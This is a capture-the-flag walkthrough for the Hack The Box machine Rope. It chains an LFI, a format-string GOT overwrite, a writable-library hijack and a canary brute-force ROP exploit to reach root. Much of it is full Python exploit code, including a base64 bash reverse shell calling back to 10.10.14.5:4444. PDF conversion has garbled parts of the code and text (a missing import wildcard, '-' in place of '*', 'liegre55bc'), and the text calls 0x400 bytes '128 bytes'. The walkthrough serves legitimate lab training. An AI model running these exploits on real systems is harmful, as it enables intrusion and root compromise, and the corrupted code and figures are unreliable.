# Rope

*Converted from: Rope.pdf*

---

# Rope

1 [st] March 2020 / Document No D20.100.50


Prepared By: MinatoTW


Machine Author(s): r4j


Difficulty: Insane


Classification: Official


## **Synopsis**

Rope is an insane difficulty Linux machine covering different aspects of binary exploitation. The

web server can be exploited to gain access to the file system and download the binary. The

binary is found to be vulnerable to format string exploitation, which is leveraged to get remote

code execution. After gaining foothold, the user is found to have access to a shared library, which

can be modified to execute code as another user. A service running on localhost can be exploited

via a ROP (Return Oriented Programming) attack to gain a root shell.
### **Skills Required**


Enumeration

Pwntools Scripting

Basic C and Reversing
### **Skills Learned**


Format String Exploitation

Canary & PIE (Position Independent Executable) Bypass

ROP Chains


## **Enumeration**

### **Nmap**





SSH is found to be running on it's default port, along with an unknown HTTP server running on

port 9999.
### **HTTP**


Browsing to port 9999 in the browser, we come across a login page.

#### **Nikto**


Let's run nikto on the web server to perform automated checks.

According to Nikto, we should be able to read files by prefixing / to the filename. Let's try this

out.


This confirms the vulnerability and let's us access the entire filesystem.

Browsing to the /opt folder, a subdirectory named www is found containing the web server

source code.


The contents of run.sh are:


The scripts runs in a loop and executes the httpserver binary if it crashes or exits. Let's

download the binary and analyze it.


Let's examine the binary protections.

### **Reverse Engineering**


It's a 32-bit binary, which has all protections enabled. Import it into Ghidra and go to the

codebrowser for a high-level overview. Select the main function from the Symbol Tree window

on the left.

After the initial setup, the binary calls open_listenfd to bind to the desired port and start

listening for requests. It then prints some information and then drops in a loop until a request is

received through accept() . The signature of the accept() [function](http://man7.org/linux/man-pages/man2/accept.2.html) is:


Once a request is received, the input file descriptor local_12c is passed to the process()

function along with the sockaddr struct. Double-click on the process function to jump to it.

The binary calls fork() to spawn a child process, after which the rest of the execution continues

in the newly spawned process. It then calls parse_request(), which returns the file path into the

local_818 buffer. The open() syscall is made to access the file and check if it exists or not.

If the file exists, the fstat() function is called to check if it's a file or directory. The

serve_static() method is used to return files, whereas the handle_directory_request()

handles folders. Looking at the serve_static() function:


We see that the server supports usage of the Range header. According to the MDN

documentation, the Range header can specified to read only a range of bytes in the document.

For example, Range: bytes=0-500 will only return the first 500 bytes of the file.


Later in the function, the writen() method is used to write the file contents to the file

descriptor. In cases when the Range header is used, the sendfile() method is used to read the

specified range of bytes and send the output.

Let's go back to the process function. After handling the request, the log_access() method is

called with three parameters, where the first parameter is the HTTP status code, the second

parameter is the sockaddr struct and the third one contains the requested file path.


Looking at the log_access() method, it retains the host address from the sockaddr struct and

then calls printf() to print logs. The first printf prints the status code and the address, whereas

the second printf prints the requested file directly without using the %s format string. This

induces a format string vulnerability into the binary, leading to arbitrary read and write access.
### **Exploit Development**


Let's test this out by running the server locally. Start the httpserver and make a request using

curl.


As expected, we see the server printing the logs. Let's write a python script to interact with and

send requests to the server.





We can read strings from the stack using the %lx format string, which prints data as hex

integers. The server will identify %x as a URL encoded byte and attempt to decode it. We can

avoid this by URL encoding the % symbol using the urllib.quote() method.







The quote() function replaces all occurrences of % with it's URL encoded value %25 .


We were able to read strings from the stack. Let's find the offset of our input payload next.

Change the payload to:





Our input i.e. AAAAAAAA (hex encoded as 41414141 ) is found somewhere down the stack. To find

the exact offset, we can split the string on . and then find the length of the resulting list.


The length of the list is 54, which means our input is present at the 53rd offset on the stack. Let's

verify this by referencing the 53rd offset using the $ symbol.





The image above confirms that we have the right offset. Going back to the log_access()

function, we see that it calls puts() after printf() .


The third puts() call prints the user input i.e. the request method. We can use the format string

vulnerability to overwrite the GOT entry for puts with the address of the system() function, and

then execute any commands using the request method string. However, we know that the binary

has PIE (Position Independent Executable) turned on, which means that the addresses are

different each time the binary reloads.

However, since we already have access to the filesystem, we can read /proc/self/maps to find

the addresses at which the binary and libc are loaded.

Requesting the page in browser returns an empty response. This is because /proc is a virtual

filesystem and all files have 0 length.

This will result in the failure of the writen() method due to an invalid length. We can overcome

this by making use of the Range header and specifying the range of bytes to be read, which will

be handled by the sendfile() method. The -r  flag in curl can be used to specify the range.


The contents of /proc/self/maps were successfully retrieved. Looking at the [documentation](http://man7.org/linux/man-pages/man2/fork.2.html) for

fork(), we find that:


This means the base addresses for the parent process will be replicated in all the children. The

output can be parsed to get the liegre55bc and binary base addresses.


#!/usr/bin/python


from pwn import  

from requests import get


from urllib import quote


def parseMaps(maps):


binary_base = int(maps[0].split('-')[0], 16)


libc_base = int(maps[6].split('-')[0], 16)


return binary_base, libc_base


def getMaps():


headers = { "Range" : "bytes=0-1000" }


maps = get("http://localhost:9999//proc/self/maps", headers = headers)


return parseMaps(maps.content.splitlines())


binary_base, libc_base = getMaps()


log.success("Binary base address: {}".format(hex(binary_base)))


log.success("Libc base address: {}".format(hex(libc_base)))


r = remote('127.0.0.1', 9999)


payload = quote("AAAAAAAA.%53$x.%54$x")


r.sendline("GET /{} HTTP/1.1\n".format(payload))


r.close()


The updated script above sends a request to get the process maps, and then parses the output

to display the libc and the binary base addresses.

Next, we can find the GOT address of puts using pwntools, and then overwrite it using the %n

format string. The %n format string writes the number of bytes already printed by printf to the

stack.


#!/usr/bin/python


from pwn import  

from requests import get


from urllib import quote


def parseMaps(maps):


binary_base = int(maps[0].split('-')[0], 16)


libc_base = int(maps[6].split('-')[0], 16)


return binary_base, libc_base


def getMaps():


headers = { "Range" : "bytes=0-1000" }


maps = get("http://localhost:9999//proc/self/maps", headers = headers)


return parseMaps(maps.content.splitlines())


binary_base, libc_base = getMaps()


log.success("Binary base address: {}".format(hex(binary_base)))


log.success("Libc base address: {}".format(hex(libc_base)))


b = ELF("./httpserver")


puts_got = b.got["puts"]


puts = binary_base + puts_got


log.success("puts address: {}".format(hex(puts)))


r = remote('127.0.0.1', 9999)


payload = quote(p32(puts) + ".%53$n")


r.sendline("GET {} HTTP/1.1\n".format(payload))


r.close()

The script finds the offset for puts and then calculates it's address in the binary. Then the %53$n

format string is used to write to the 53rd offset i.e. the address we supplied. Run the binary with

gdb and set follow-fork-mode to child so that we can follow through the child's execution.


Next, execute the script.


Going back to GDB, we see the following:


GET


[Attaching after process 92573 fork to child process 93356]


[New inferior 2 (process 93356)]


0x00000005 in ?? ()


[ Legend: Modified register | Code | Heap | Stack | String ]


───────────────────────────────────────────registers ────


$eax  : 0x565581e2 → 0x743c0000


$ebx  : 0x5655a000 → 0x00004efc


$ecx  : 0x0


$edx  : 0xf7fa9010 → 0x00000000


$esp  : 0xffffd1bc → 0x56557103 → <log_access+140> add esp, 0x10


$ebp  : 0xffffd1f8 → 0xffffdaa8 → 0xffffdc08 → 0x00000000


$esi  : 0xda26


$edi  : 0xf7fa7000 → 0x001dbd6c


$eip  : 0x5


$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow RESUME


virtualx86 identification]


$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063


───────────────────────────────────────── stack ────


0xffffd1bc│+0x0000: 0x56557103 → <log_access+140> add esp, 0x10    ← $esp


────────────────────────────────────── code:x86:32 ────


[!] Cannot disassemble from $PC


[!] Cannot access memory at address 0x5


─────────────────────────────────────── threads ────


[#0] Id 1, Name: "httpserver", stopped, reason: SIGSEGV

The program crashed as it wasn't able to execute the instruction at 0x0000005, this is because

we wrote 5 bytes to the puts GOT address (4 bytes for the address and one byte for the dot).

Having confirmed the write access, we can now overwrite the address with the system address

from libc. Calculating the number of bytes to write for system can be tedious, so we can use the

fmtstr_payload() function from [pwntools](https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) instead.


#!/usr/bin/python


from pwn import  

from requests import get


from urllib import quote


context(arch='i686', os='linux')


def parseMaps(maps):


binary_base = int(maps[0].split('-')[0], 16)


libc_base = int(maps[6].split('-')[0], 16)


return binary_base, libc_base


def getMaps():


headers = { "Range" : "bytes=0-1000" }


maps = get("http://localhost:9999//proc/self/maps", headers = headers)


return parseMaps(maps.content.splitlines())


binary_base, libc_base = getMaps()


log.success("Binary base address: {}".format(hex(binary_base)))


log.success("Libc base address: {}".format(hex(libc_base)))


b = ELF("./httpserver")


l = ELF("/lib/i386-linux-gnu/libc.so.6")


puts_got = b.got["puts"]


puts = binary_base + puts_got


system_libc = l.symbols["system"]


system = libc_base + system_libc


log.success("puts address: {}".format(hex(puts)))


log.success("system address: {}".format(hex(system)))


r = remote('127.0.0.1', 9999)


payload = fmtstr_payload(53, { puts : system })


r.sendline("GET {} HTTP/1.1\n".format(quote(payload)))


The fmtstr_payload() method takes in two arguments, where the first argument denotes the

offset of the overwrite and the second argument is a dict containing the target address and

value. In the code above, we're trying to overwrite the GOT address of puts with the address of

the system() function. Start the server on another terminal and execute this script.


Going back to the binary, we find that it tried to execute the GET command.

This is because the log_access method called puts("GET") but ended up calling system("GET"),

as we overwrote puts with system.


## **Foothold**

We can go ahead and use this script to execute a reverse shell on the box now. A command with

spaces can't be used, due to the nature of HTTP requests. However, the $IFS shell variable can be

used to separate values instead.


First, encode a bash reverse shell as base64.


This command can be decoded and piped to bash for execution.


Before exploiting the box, we'll need a copy of the remote libc. This can be downloaded through

the LFI.


Update the script to use this library and add the correct IP address.


#!/usr/bin/python


from pwn import  

from requests import get


from urllib import quote


context(arch='i686', os='linux')


def parseMaps(maps):


binary_base = int(maps[0].split('-')[0], 16)


libc_base = int(maps[6].split('-')[0], 16)


return binary_base, libc_base


def getMaps():


headers = { "Range" : "bytes=0-1000" }


maps = get("http://10.10.10.148:9999//proc/self/maps", headers = headers)


return parseMaps(maps.content.splitlines())


binary_base, libc_base = getMaps()


log.success("Binary base address: {}".format(hex(binary_base)))


log.success("Libc base address: {}".format(hex(libc_base)))


b = ELF("./httpserver")


l = ELF("./libc.so.6")


puts_got = b.got["puts"]


puts = binary_base + puts_got


system_libc = l.symbols["system"]


system = libc_base + system_libc


log.success("puts address: {}".format(hex(puts)))


log.success("system address: {}".format(hex(system)))


r = remote('10.10.10.148', 9999)


payload = fmtstr_payload(53, { puts : system })


cmd =


"echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==|base64${IFS}


-d|bash"


r.sendline("{} {} HTTP/1.1\n".format(cmd, quote(payload)))

Executing the script should return a shell as the user john .


## **Lateral Movement**

We can copy our public key to john's authorized_keys for an interactive SSH session.


Looking at the user's sudo privileges, it's found that he can execute a binary as r4j.

The binary prints out the contents of /var/log/auth.log on execution.


Looking at the shared object dependencies using ldd, an unknown library is seen.


Let's transfer both of these using scp and analyze them using Ghidra.


After opening the binary in CodeBrowser, expand the function in the symbol tree. It's found that

the main() function ends up calling the printlog() function. This function is present in the

liblog.so library.

The printlog() function does nothing but execute the command above. This isn't vulnerable to

any kind of overflow as it's a constant string. Going back to the box and looking at the file

permissions on the library, it's found to be world writable.


This will let us compile a malicious library and replace the existing one. Create a C program with

the following contents:



The function printlog() executes /bin/bash using the system function. Next, compile it as a

shared object using GCC.


Transfer the compiled library to the desired location using scp.


Going back to the SSH session and executing the binary, a shell as r4j should be spawned.


## **Privilege Escalation**

A public key can be copied to r4j's folder to gain SSH access as before. Looking at the processes

running as root, the following process is seen.


Let's transfer the contact binary and analyze it locally.

All binary protections are found to be turned on, according to checksec .

Opening it up in Ghidra and selecting the Defined Strings window.


There are some interesting strings to be seen, which are similar to the ones found in the HTTP

server earlier. Double-click on the listen on port... string, and then right-click > References >

Show References to this address. Double-click on the reference shown in the pop-up window to

navigate to it.


The binary creates a listener on port 1337 and waits for connections. The function FUN_001014ee

is called with the fd, as soon as a connection is received. Double-click on the name to navigate to

it.

The function executes fork() and spawns a child process. Then, the write() function is used

to send a prompt to the client, followed by a call to another function.

This function calls the recv() function and reads 0x400 i.e. 128 bytes from the client. This input

is written **to** the local_48 buffer, which is 56 bytes in length. This will result in a buffer overflow if

an input length greater than 56 is sent. However, this overflow can't be directly exploited due to

the presence of a stack canary. The stack canary is a value containing 8 random bytes, which sits

above the stack base. This value is stored and checked for changes before the function exists.

Any change in the canary will result in an exception and process exit.
### **Exploit Development**


Let's try verifying the observations made above on the binary. Execute the binary and then input

the following commands on another terminal.


The first input was 57 bytes (56 As and a line break) in length while the second input was 56 in

length. As seen in the image above, the server responded with the message Done. when the

input length was 56. Looking at the terminal executing the binary, we see the following output.


As expected, the binary crashed when the input was greater than 56 and a stack smashing

detected message was printed as a result of the corrupted canary. Let's look at this in GDB. Add

a break point at the recv function and run the binary.

Send an input with 57 characters, after which the breakpoint should be hit. Enter n to jump out

of the recv function and go back to the calling function. The entire stack can be printed using

the stack command.


gef➤ n

<SNIP>

gef➤ stack

─────────────────────── Stack bottom (lower address)──────────────────────


0x00007fffffffe410│+0x0000: 0x0000000000000000  ← $rsp


0x00007fffffffe418│+0x0008: 0x0000000400000000


0x00007fffffffe420│+0x0010: "AAAA<SNIP>AAAAAA[...]"  ← $rsi


0x00007fffffffe428│+0x0018: "AAAAAA<SNIP>AAAAA\n[...]"


0x00007fffffffe430│+0x0020: 0x4141414141414141


0x00007fffffffe438│+0x0028: 0x4141414141414141


0x00007fffffffe440│+0x0030: 0x4141414141414141


0x00007fffffffe448│+0x0038: 0x4141414141414141


0x00007fffffffe450│+0x0040: 0x4141414141414141


0x00007fffffffe458│+0x0048: 0xd86036e0540b060a


0x00007fffffffe460│+0x0050: 0x00007fffffffe490 ← $rbp


0x00007fffffffe468│+0x0058: 0x0000555555555562 →  mov eax, DWORD PTR [rbp

0x14] ($savedip)


─────────────────────────── Stack top (higher address) ──────

The snippet above shows the stack layout, RBP is found at the address 0x00007fffffffe460 and

the canary can be seen above it. The first byte of the canary is found to be 0a, which is the hex

code for new line, which was part of our input. We already know the server sends a Done

message if the canary is intact. This can be used to perform an oracle attack and bruteforce the

canary byte-by-byte until the Done message is received. The canary will remain constant across

all child processes, since the child and parent share the same memory layout. Let's write a

python script to do this.



The script starts from the first byte, and bruteforces all characters between 0x00 and 0xff until it

receives a Done. response. All successful characters are appended to the canary until it reaches

a length of 8.


Similarly, we can bruteforce the RBP address as well as the saved returned address. The saved

return address can be used to calculate the base of the binary, which will let us utilize functions

within the binary.



The script is modified with the changes shown above. Running the script should return all three

values.


Let's go back to GDB and find the offset between the saved RIP and binary base addresses.

Restart the process and add a breakpoint at recv, send an input with 56 characters and enter n

to continue. The vmmap command can be used to find the binary base address.



The saved RIP is set to 0x0000555555555562 and the binary base address is

0x0000555555554000, which means the difference between them is 0x1562 . This value can be

used to calculate addresses of gadgets and functions. We can leak the GOT address of any

function used by the binary, and use it to calculate the libc base address. This can be achieved by

using the write function to send back the leaked address.


The [write](http://man7.org/linux/man-pages/man2/write.2.html) function takes in three arguments: the output fd, the buffer to print and the number of

bytes to print. According to the 64-bit Linux calling convention, the arguments should be passed

in the RDI, RSI and RDX registers. Going back to GDB and looking at the registers, it's seen that

the file descriptor is already present in RDI.


This allows us to skip setting RDI to the fd manually. The RSI and RDX registers can be set using

using POP instructions, which can be found using ropper .


There's no POP RSI gadget, but ropper was able to find a POP RSI; POP R15 gadget. We can

introduce some junk into our payload to compensate for the extra pop. Next, RSI needs to be set

to the GOT address to write, which can be found using pwntools. The RDX value should be set

to 8, as we're trying to leak an 8 byte address.


from pwn import  

import sys


def getByte(chars):


for ch in range(0x00, 0x100):


r = remote('localhost', 1337, level = 'error')


payload = "A"    - 56 + chars + chr(ch)


r.recvline()


r.send(payload)


try :


resp = r.recvline(timeout=2).rstrip()


if "Done." == resp:


r.close()


return ch


except:


sys.stdout.write('{:02x}\x08\x08'.format(ch))


pass


r.close()


def getContent(chars):


content = ''


while len(content) != 8:


ch = getByte(chars + content)


content += chr(ch)


sys.stdout.write('{:02x}'.format(ch))


return content


sys.stdout.write("Canary: ")


canary = getContent('')


print("\n[*] Canary found: {}".format(hex(u64(canary))))


sys.stdout.write("RBP: ")


rbp = getContent(canary)


print("\n[*] RBP found: {}".format(hex(u64(rbp))))


sys.stdout.write("Saved return address: ")


savedRip = u64(getContent(canary + rbp))


print("\n[*] Saved return address found: {}".format(hex(savedRip)))


e = ELF("./contact")


binaryBase = savedRip  - 0x1562


pieAddr = lambda addr : addr + binaryBase


'''


0x0000000000001265: pop rdx; ret;


'''


pop_rdx = p64(pieAddr(0x1265))


'''


0x0000000000001649: pop rsi; pop r15; ret;


'''


pop_rsi_r15 = p64(pieAddr(0x1649))


write_GOT = p64(pieAddr(e.got['write']))


write = p64(pieAddr(e.symbols['write']))


chain = "A"* 56 + canary + rbp


# overwrite return address


chain += pop_rdx + p64(0x8)


chain += pop_rsi_r15 + write_GOT + "B"  - 8 # junk


chain += write # call write function


'''


write(fd, write@GOT, 0x8)


'''


r = remote('localhost', 1337, level = 'error')


r.recvline()


r.send(chain)


write_libc = u64(r.recv(8))


log.success("Leaked write@libc: {}".format(hex(write_libc)))


r.close()


The script calculates the base address and then uses it to find the addresses of the gadgets. Next,

the GOT address and the PLT address for write are found. A chain is created to pop 0x8 and

write_GOT into RDX and RSI respectively.


Running the script above leaks the libc write address, which can be used to find the libc base

address. Once the libc address is found, it can be used to calculate a one_gadget. [One_gadget](https://github.com/david942j/one_gadget) is a

tool that finds addresses in libc leading to an execve("/bin/sh", NULL, NULL) function call.


Note: These addresses vary from host to host.


The third gadget looks convenient, and just needs rsi and rdx to be null. We can clear them out by

using the pop rsi; pop r15; ret and pop rdx; ret gadgets. When execve executes /bin/sh,

as stdout and stdin are present on the server side, this means that we won't be able to interact

with the process remotely. We can get around this by calling the [dup2](http://man7.org/linux/man-pages/man2/dup.2.html) function, and duplicating

the stdin (0x0) and stdout (0x1) file descriptors. The dup2 function accepts two arguments, the

first is the oldfd i.e. our socket and the second is the newfd i.e. stdin / stdout.


The calls above will duplicate stdin and stdout to the new fd i.e. 4, after which we should be able

to interact with the shell.


from pwn import  

import sys


def getByte(chars):


for ch in range(0x00, 0x100):


r = remote('localhost', 1337, level = 'error')


payload = "A"    - 56 + chars + chr(ch)


r.recvline()


r.send(payload)


try :


resp = r.recvline(timeout=2).rstrip()


if "Done." == resp:


r.close()


return ch


except:


r.close()


sys.stdout.write('{:02x}\x08\x08'.format(ch))


pass


def getContent(chars):


content = ''


while len(content) != 8:


ch = getByte(chars + content)


content += chr(ch)


sys.stdout.write('{:02x}'.format(ch))


return content


sys.stdout.write("Canary: ")


canary = getContent('')


print("\n[*] Canary found: {}".format(hex(u64(canary))))


sys.stdout.write("RBP: ")


rbp = getContent(canary)


print("\n[*] RBP found: {}".format(hex(u64(rbp))))


sys.stdout.write("Saved return address: ")


savedRip = u64(getContent(canary + rbp))


print("\n[*] Saved return address found: {}".format(hex(savedRip)))


e = ELF("./contact")


binaryBase = savedRip - 0x1562


pieAddr = lambda addr : addr + binaryBase


'''


0x0000000000001265: pop rdx; ret;


'''


pop_rdx = p64(pieAddr(0x1265))


'''


0x0000000000001649: pop rsi; pop r15; ret;


'''


pop_rsi_r15 = p64(pieAddr(0x1649))


'''


0x000000000000164b: pop rdi; ret;


'''


pop_rdi = p64(pieAddr(0x164b))


write_GOT = p64(pieAddr(e.got['write']))


write = p64(pieAddr(e.symbols['write']))


chain = "A"* 56 + canary + rbp


# overwrite return address


chain += pop_rdx + p64(0x8)


chain += pop_rsi_r15 + write_GOT + "B" - 8 # junk


chain += write # call write function


'''


write(fd, write@GOT, 0x8)


'''


r = remote('localhost', 1337, level = 'error')


r.recvline()


r.send(chain)


write_libc = u64(r.recv(8, timeout=2))


log.success("Leaked write@libc: {}".format(hex(write_libc)))


r.close()


libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


libc_base = write_libc - libc.symbols['write'] # Find libc base address


log.success("Libc based address: {}".format(hex(libc_base)))


dup2 = p64(libc_base + libc.symbols['dup2']) # Calculate dup2 address


'''


0xe2386 execve("/bin/sh", rsi, rdx)


'''


one_gadget = p64(libc_base + 0xe2386)


chain = "A" - 56 + canary + rbp


# overwrite return address


chain += pop_rdi + p64(0x4) # oldfd


chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # newfd : stdin


chain += dup2 # call dup2


'''


dup2(0, 4);


'''


chain += pop_rdi + p64(0x4) # oldfd


chain += pop_rsi_r15 + p64(0x1) + "JUNKJUNK" # newfd : stdout


chain += dup2 # call dup2


'''


dup2(1, 4);


'''


chain += pop_rdx + p64(0x0) # Zero out rdx


chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # Zero out rsi


chain += one_gadget # call execve


'''


execve("/bin/sh", NULL, NULL);


'''


log.info("Sending final payload")


r = remote('localhost', 1337, level = 'error')


r.recvline()


r.send(chain)


r.interactive()


The script calculates the libc base address and uses it to find the addresses for the dup2 function

and the execve gadget. Then, a ROP chain is created to execute the dup2 calls followed by


Now that we have it working locally, the remote libc can be downloaded. We'll have to forward

port 1337 from the remote box using SSH, in order to exploit it.


Update the script with the path to the remote libc, and swap the existing one_gadget with a new

one.


The second gadget looks fine and can be swapped with the local one. Here's the final exploit.


from pwn import  

import sys


def getByte(chars):


for ch in range(0x00, 0x100):


r = remote('localhost', 1337, level = 'error')


payload = "A"    - 56 + chars + chr(ch)


r.recvline()


r.send(payload)


try :


resp = r.recvline(timeout=2).rstrip()


if "Done." == resp:


r.close()


return ch


except:


r.close()


sys.stdout.write('{:02x}\x08\x08'.format(ch))


pass


def getContent(chars):


content = ''


while len(content) != 8:


ch = getByte(chars + content)


content += chr(ch)


sys.stdout.write('{:02x}'.format(ch))


return content


sys.stdout.write("Canary: ")


canary = getContent('')


print("\n[*] Canary found: {}".format(hex(u64(canary))))


sys.stdout.write("RBP: ")


rbp = getContent(canary)


print("\n[*] RBP found: {}".format(hex(u64(rbp))))


sys.stdout.write("Saved return address: ")


savedRip = u64(getContent(canary + rbp))


print("\n[*] Saved return address found: {}".format(hex(savedRip)))


e = ELF("./contact")


binaryBase = savedRip - 0x1562


pieAddr = lambda addr : addr + binaryBase


'''


0x0000000000001265: pop rdx; ret;


'''


pop_rdx = p64(pieAddr(0x1265))


'''


0x0000000000001649: pop rsi; pop r15; ret;


'''


pop_rsi_r15 = p64(pieAddr(0x1649))


'''


0x000000000000164b: pop rdi; ret;


'''


pop_rdi = p64(pieAddr(0x164b))


write_GOT = p64(pieAddr(e.got['write']))


write = p64(pieAddr(e.symbols['write']))


chain = "A"* 56 + canary + rbp


# overwrite return address


chain += pop_rdx + p64(0x8)


chain += pop_rsi_r15 + write_GOT + "B" - 8 # junk


chain += write # call write function


'''


write(fd, write@GOT, 0x8)


'''


r = remote('localhost', 1337, level = 'debug')


r.recvline()


r.send(chain)


write_libc = u64(r.recv(8, timeout=2))


log.success("Leaked write@libc: {}".format(hex(write_libc)))


r.close()


libc = ELF("./libc.so.6_64")


libc_base = write_libc - libc.symbols['write'] # Find libc base address


log.success("Libc based address: {}".format(hex(libc_base)))


dup2 = p64(libc_base + libc.symbols['dup2']) # Calculate dup2 address


'''


0x4f322 execve("/bin/sh", rsp+0x40, environ)


'''


one_gadget = p64(libc_base + 0x4f322 )


chain = "A" - 56 + canary + rbp


# overwrite return address


chain += pop_rdi + p64(0x4) # oldfd


chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # newfd : stdin


chain += dup2 # call dup2


'''


dup2(0, 4);


'''


chain += pop_rdi + p64(0x4) # oldfd


chain += pop_rsi_r15 + p64(0x1) + "JUNKJUNK" # newfd : stdout


chain += dup2 # call dup2


'''


dup2(1, 4);


'''


chain += pop_rdx + p64(0x0) # Zero out rdx


chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # Zero out rsi


chain += one_gadget # call execve


'''


execve("/bin/sh", NULL, NULL);


'''


log.info("Sending final payload")


r = remote('localhost', 1337, level = 'error')


r.recvline()


r.send(chain)


r.interactive(prompt = '# ')


